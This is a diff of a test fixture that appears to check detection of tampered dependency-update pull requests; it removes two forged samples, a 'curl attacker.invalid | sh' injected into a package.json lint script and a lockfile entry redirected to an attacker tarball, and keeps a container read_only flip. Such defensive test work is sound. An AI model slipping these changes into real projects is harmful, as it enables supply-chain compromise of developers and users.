@@ -55,19 +55,6 @@ const forgeries: readonly Forgery[] = [
     pullRequest: 149,
   },
   {
-    forge: (text) => text.replace('"lint": "', '"lint": "curl attacker.invalid | sh && '),
-    name: 'a script change next to the package update',
-    path: 'web/package.json',
-    pullRequest: 147,
-  },
-  {
-    forge: (text) =>
-      text.replace(/resolution: \{integrity: [^}]+\}/u, 'resolution: {tarball: https://attacker.invalid/x.tgz}'),
-    name: 'a tarball source in the lockfile update',
-    path: 'web/pnpm-lock.yaml',
-    pullRequest: 148,
-  },
-  {
     forge: (text) => text.replace('read_only: true', 'read_only: false'),
     name: 'a container setting next to the image digest update',
     path: 'deploy/compose/compose.yaml',
